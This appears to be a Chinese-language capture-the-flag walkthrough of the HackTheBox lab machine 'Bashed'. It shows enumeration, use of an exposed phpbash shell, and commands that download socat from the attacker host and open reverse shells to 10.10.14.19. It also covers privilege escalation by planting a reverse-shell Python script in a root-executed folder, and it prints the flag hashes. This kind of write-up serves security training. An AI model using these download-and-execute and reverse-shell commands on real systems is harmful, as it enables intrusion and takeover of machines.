# Bashed

> victim: 10.10.10.68
> local: 10.10.14.19

仅有HTTP服务-80

## Web

可以看到是一个phpbash的东西，其它没讲啥了，扫描一下吧

```bash
gobuster dir -u http://10.10.10.68/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -s '200,204,301,302,307,403,500' -e -x php > gobuster.txt
```

没扫描到特别有意思的东西

利用nikto

```bash
nikto -host=http://10.10.10.68/
```

找到敏感目录`/dev/`

成功进入phpbash

## 升级到socat shell

```bash
#victim
/bin/uname -a 
# 获取到目标机为 x86_64
```

```bash
#local
sudo proxychains4 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /var/www/html/socat
sudo systemctl start apache2

socat file:`tty`,raw,echo=0 tcp-listen:4444
```

```bash
wget http://10.10.14.19/socat -O /tmp/socat
chmod 777 /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.19:4444
```

成功获取完整shell

得到user.txt

```
2c281f318555dbc1b856957c7147bfc1
```

## Privilage Escalation

尝试LinEnum.sh检查

```bash
./LinEnum.sh |grep '\[+\]'
```

发现

```
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

可以不加密码以scriptmanager执行任何操作

```bash
sudo -u scriptmanager ./LinEnum.sh > a.txt
```

```bash
cat a.txt -n |grep '\[+\]'
```

```
     9  [+] Thorough tests = Disabled
  1102  [+] Files with POSIX capabilities set:
```

```bash
sed -n '1102,1132p' a.txt # 查看1102~1132行
```

Linux Exploit Suggester无法提供合适的漏洞

### scriptmanager专用文件夹

`/scripts`

通过观察，脚本生成的文件是属于root的，而脚本是我们的，说明脚本我们可以自定义，且会以root执行

```python
import os
os.system("/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.19:4445")
```

```bash
echo "import os"> test.py 
echo "os.system(\"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.19:4445\")" >> test.py 
```

得到root.txt

```
cc4f0afe3a1026d402ba10329674a8e2
```

